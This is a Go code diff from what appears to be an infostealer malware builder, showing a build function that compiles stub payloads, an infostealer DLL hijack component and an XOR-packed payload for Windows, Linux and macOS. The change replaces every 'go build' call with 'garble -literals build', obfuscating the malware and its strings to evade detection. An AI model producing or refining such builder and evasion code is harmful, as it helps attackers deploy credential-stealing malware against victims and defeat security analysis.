@@ -211,11 +211,11 @@ func build(platform string) {
 	switch strings.ToLower(platform) {
 	case "linux":
 		fmt.Printf("Compiling platform specifics for linux...\n")
-		platformspecific = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/infostealer/cryptunprotectwine.exe", "Stub/infostealer/cryptunprotectwine/wine_exe.go")
+		platformspecific = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "Stub/infostealer/cryptunprotectwine.exe", "Stub/infostealer/cryptunprotectwine/wine_exe.go")
 		platformspecific.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
 	case "windows":
 		fmt.Printf("Compiling platform specifics for windows...")
-		platformspecific = exec.Command("go", "build", "-buildmode=c-shared", "-ldflags=-s -w", "-o", "Stub/infostealer/v20.dll", "Stub/infostealer/v20hijack/dll.go")
+		platformspecific = exec.Command("garble", "-literals", "build", "-buildmode=c-shared", "-ldflags=-s -w", "-o", "Stub/infostealer/v20.dll", "Stub/infostealer/v20hijack/dll.go")
 		platformspecific.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1")
 	}
 
@@ -234,15 +234,15 @@ func build(platform string) {
 	switch strings.ToLower(platform) {
 	case "windows":
 		fmt.Printf("Compiling main payload for Windows...\n")
-		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload.exe", "Stub/stub.go")
+		cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "Stub/payload.exe", "Stub/stub.go")
 		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
 	case "linux":
 		fmt.Printf("Compiling main payload for Linux...\n")
-		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
+		cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
 		cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
 	case "mac":
 		fmt.Printf("Compiling main payload for Mac OS...\n")
-		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
+		cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
 		cmd.Env = append(os.Environ(), "GOOS=darwin", "GOARCH=amd64")
 	}
 
@@ -289,15 +289,15 @@ func build(platform string) {
 		switch strings.ToLower(platform) {
 		case "windows":
 			fmt.Printf("Compiling xor payload for Windows...\n")
-			cmd = exec.Command("go", "build", "-H=windowsgui -ldflags=-s -w", "-o", "bin/payload.exe", "Stub/xor/xor.go")
+			cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w -H=windowsgui", "-o", "bin/payload.exe", "Stub/xor/xor.go")
 			cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
 		case "linux":
 			fmt.Printf("Compiling xor payload for Linux...\n")
-			cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
+			cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
 			cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
 		case "mac":
 			fmt.Printf("Compiling xor payload for Mac OS\n")
-			cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
+			cmd = exec.Command("garble", "-literals", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
 		}
 
 		cmd.Stdout = os.Stdout
